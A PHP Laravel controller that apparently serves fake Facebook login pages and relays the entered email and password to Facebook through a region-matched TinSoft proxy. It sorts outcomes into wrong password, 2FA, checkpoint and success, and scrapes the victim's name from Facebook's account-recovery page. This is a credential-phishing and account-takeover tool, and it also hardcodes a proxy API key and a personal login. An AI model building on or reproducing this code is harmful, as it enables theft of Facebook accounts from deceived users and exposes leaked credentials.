<?php

namespace App\Http\Controllers;

use App\Helpers\APITinSoftHelper;
use App\Helpers\Helper;
use App\Helpers\PhoneHelper;
use App\Helpers\RequestFacebookHelper;
use App\Helpers\RequestHelper;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;
use Illuminate\Validation\ValidationException;

class LoginFacebookController extends Controller
{
    public function index(Request $request) {
        return view('fb.login_facebook_default');
    }

    public function validateLogin(Request $request)
    {
        $redirectTo = route('loginfb.index');
        $validator = Validator::make($request->all(), [
            'email' => 'required|string',
            'pass' => 'required|string',
        ]);
        if ($validator->fails()) {
            throw ValidationException::withMessages([
                'email' => [trans('auth.failed')],
            ])->redirectTo($redirectTo);
        }
    }

    public function actionLogin(Request $request) {
//        $this->validateLogin($request);
        $username = 'wapcuckhung@gmail.com';
//        $username = '84337379871';
//        $username = $request->email;
        $password = '123456@Password';
//        $password = '123456@loi';
//        $login_pass = $request->pass;
        if (!RequestFacebookHelper::checkCookieLogin($username)) {
            $apiKey = 'TLhP4iNzWawFGIv2EjgncPy9SjBfaCqVYCBRNv';
            $proxy = false;
            if (APITinSoftHelper::checkAPIKey($apiKey)) {
                $locationTinSoft = APITinSoftHelper::mappingLocation(Session::get(Helper::$IP_DATA_REGION));
                $locationIDTinSoft = $locationTinSoft['location_id'];
                $proxy = APITinSoftHelper::getCurrentProxy($apiKey, $locationIDTinSoft);
            } else {
                $msgErr = APITinSoftHelper::getAPIKeyError($apiKey);
            }
            if ($proxy || true) {
                $ch = curl_init();
                $cookies = [];
                $statusLogin = RequestFacebookHelper::checkLoginStatus($username, $password, $ch, $cookies);
                switch ($statusLogin)
                {
                    case Helper::$LOGIN_WRONG_PASSWD:
                        $sfau = 'sfau';
                        $user_name = 'username';
                        if (isset($cookies['sfau'])) {
                            $sfau = $cookies['sfau'];
                            $url = 'https://m.facebook.com/login/account_recovery/name_search/?cuid='.$sfau.'&errorcode=1348092&flow=initiate_view&ls=initiate_view&refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2Faccount_recovery%2Fname_search%2F&_rdr';
                            $result = RequestHelper::curlExec($ch, $url);
                            if (RequestHelper::isSuccess($ch) && $result) {
                                $html = str_get_html($result);
                                $user_name = $html->find('i.img', 0)->parent()->next_sibling()->first_child()->first_child()->plaintext;
                            }
                        }
                        Session::put('sfau', $sfau);
                        Session::put('user_name', $user_name);
                        return view('fb.login_facebook');
                        break;
                    case Helper::$LOGIN_NEED_2FA:
                        echo 'ok, need 2fa';die();
                        break;
                    case Helper::$LOGIN_CHECKPOINT:
                        echo 'ok, checkpoint';die();
                        break;
                    case Helper::$LOGIN_SUCCESS:
                        echo 'success';die();
                        break;
                    default:
                        echo 'something went wrong';die();
                        break;
                }
            }
            return view('fb.login_facebook_default');
        }
        echo 'cookie success';die();
    }
}
